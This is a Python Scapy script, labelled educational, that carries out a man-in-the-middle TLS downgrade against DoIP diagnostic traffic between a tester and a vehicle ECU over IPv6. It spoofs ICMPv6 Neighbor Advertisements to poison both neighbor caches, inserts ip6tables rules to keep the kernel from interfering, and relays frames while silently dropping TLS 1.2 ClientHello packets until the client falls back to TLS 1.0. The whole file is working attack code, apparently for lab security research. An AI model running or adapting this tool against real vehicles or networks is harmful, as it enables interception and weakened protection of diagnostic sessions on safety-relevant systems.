"""
Educational TLS 1.2 → TLS 1.0 downgrade (IPv6 DoIP)

TLS 1.2 ClientHello → DROPPED
TLS 1.0 ClientHello → ALLOWED
"""

from scapy.all import *
import subprocess
import threading
import signal
import sys
import time

# ===================== CONFIG =====================
# Network interface used by Scapy for sniffing/sending frames
IFACE = "vatk"

# Target TCP port (DoIP-over-TLS in your lab setup)
PORT  = 3496

# IPv6 addresses for endpoints in the lab
TESTER_IP = "fd00::40"
ECU_IP    = "fd00::10"

# Resolve attacker MAC (local NIC), and target MACs via NDP/neighbor cache lookup
ATTACKER_MAC = get_if_hwaddr(IFACE)
TESTER_MAC   = getmacbyip6(TESTER_IP)
ECU_MAC      = getmacbyip6(ECU_IP)

# Tracks whether a “downgrade observed” condition has occurred
TLS_DOWNGRADE_DONE = False

print(f"[*] Attacker MAC : {ATTACKER_MAC}")
print(f"[*] Tester MAC   : {TESTER_MAC}")
print(f"[*] ECU MAC      : {ECU_MAC}")

# ===================== IPTABLES =====================
def block_kernel_forward():
    """
    Inserts ip6tables rules to:
    - prevent the kernel from forwarding TCP packets on the target port
    - prevent local OS interference (e.g., local TCP stack packets on that port)
    """
    print("[*] Blocking kernel and local TCP interference")
    # Block forwarding
    subprocess.run(["ip6tables", "-I", "FORWARD", "-p", "tcp", "--dport", str(PORT), "-j", "DROP"])
    subprocess.run(["ip6tables", "-I", "FORWARD", "-p", "tcp", "--sport", str(PORT), "-j", "DROP"])
    # Block local OUTPUT (prevents the attacker's own OS from sending RST)
    subprocess.run(["ip6tables", "-I", "OUTPUT", "-p", "tcp", "--sport", str(PORT), "-j", "DROP"])

def restore_kernel_forward():
    """
    Removes the ip6tables FORWARD rules inserted by block_kernel_forward().
    Note: OUTPUT rule removal is not included in this function in the current code.
    """
    print("[*] Restoring kernel forwarding")
    subprocess.run([
        "ip6tables", "-D", "FORWARD",
        "-p", "tcp", "--dport", str(PORT), "-j", "DROP"
    ])
    subprocess.run([
        "ip6tables", "-D", "FORWARD",
        "-p", "tcp", "--sport", str(PORT), "-j", "DROP"
    ])

def cleanup(sig, frame):
    """
    Signal handler to restore rules and exit cleanly.
    """
    restore_kernel_forward()
    print("[*] Clean exit")
    sys.exit(0)

# Register cleanup on CTRL+C and termination
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# Apply traffic-blocking rules before starting packet manipulation
block_kernel_forward()

# ===================== TLS PARSER =====================
def clienthello_version(payload: bytes):
    """
    Extracts a TLS legacy_version from a record payload if it looks like a ClientHello.
    Returns:
      - payload[9:11] if recognized as ClientHello-like data
      - None otherwise

    Notes:
    - This is a lightweight heuristic; it does not fully parse TLS records/handshakes.
    """
    if len(payload) < 11:
        return None
    if payload[0] != 0x16:   # TLS record content type: Handshake
        return None
    if payload[5] != 0x01:   # Handshake message type: ClientHello
        return None
    return payload[9:11]

# ===================== NDP SPOOF =====================
def ndp_spoof():
    """
    Continuously sends ICMPv6 Neighbor Advertisements (NA) intended to influence
    neighbor cache entries (tester and ECU) so that traffic is sent to attacker MAC.
    """
    while True:
        # Claim ECU_IP is at ATTACKER_MAC (to the tester)
        sendp(
            Ether(dst=TESTER_MAC, src=ATTACKER_MAC) /
            IPv6(src=ECU_IP, dst=TESTER_IP) /
            ICMPv6ND_NA(tgt=ECU_IP, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC),
            iface=IFACE, verbose=0
        )

        # Claim TESTER_IP is at ATTACKER_MAC (to the ECU)
        sendp(
            Ether(dst=ECU_MAC, src=ATTACKER_MAC) /
            IPv6(src=TESTER_IP, dst=ECU_IP) /
            ICMPv6ND_NA(tgt=TESTER_IP, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC),
            iface=IFACE, verbose=0
        )
        time.sleep(1.5)

# Start background NDP announcements thread
threading.Thread(target=ndp_spoof, daemon=True).start()

# ===================== MITM =====================
def mitm(pkt):
    """
    Packet handler for sniffed frames.
    - Reads IPv6/TCP headers and Raw payload.
    - Applies “drop/forward” logic based on payload inspection.
    - Rebuilds and forwards frames at L2 with updated Ethernet dst MAC.
    """
    global TLS_DOWNGRADE_DONE

    # Only process IPv6/TCP packets
    if not (IPv6 in pkt and TCP in pkt):
        return

    ip = pkt[IPv6]
    tcp = pkt[TCP]
    payload = bytes(pkt[Raw]) if Raw in pkt else b""

    # --- PAYLOAD INSPECTION / POLICY LOGIC ---
    if ip.src == TESTER_IP and payload:
        # Heuristic: TLS record (0x16) and handshake type ClientHello (0x01)
        if payload[0] == 0x16 and payload[5] == 0x01:
            # Detect certain version markers in the beginning of the record/handshake
            if b"\x03\x03" in payload[:15] and not TLS_DOWNGRADE_DONE:
                print(f"[ATTACK] Dropping TLS 1.2 ClientHello from {ip.src}")
                return  # Packet intentionally not forwarded

            if b"\x03\x01" in payload[:15]:
                print("[SUCCESS] TLS 1.0 Fallback detected. Forwarding to ECU...")
                TLS_DOWNGRADE_DONE = True

    # --- FORWARDING LOGIC ---
    # Choose the Ethernet destination MAC based on L3 destination
    dst_mac = ECU_MAC if ip.dst == ECU_IP else TESTER_MAC

    # Rebuild a new Ethernet/IPv6/TCP packet, preserving key TCP fields and payload
    fwd = Ether(src=ATTACKER_MAC, dst=dst_mac) / \
          IPv6(src=ip.src, dst=ip.dst) / \
          TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack,
              flags=tcp.flags, window=tcp.window, options=tcp.options)

    if payload:
        fwd /= Raw(load=payload)

    # Delete checksum/length so Scapy recalculates them when sending
    del fwd[IPv6].plen
    del fwd[TCP].chksum

    sendp(fwd, iface=IFACE, verbose=0)

print("[*] TLS 1.2 blocked — TLS 1.0 allowed")

# Sniff only IPv6 TCP traffic on the selected port, excluding frames sent by attacker MAC
sniff(
    iface=IFACE,
    filter=f"ip6 and tcp port {PORT} and not ether src {ATTACKER_MAC}",
    prn=mitm,
    store=0
)
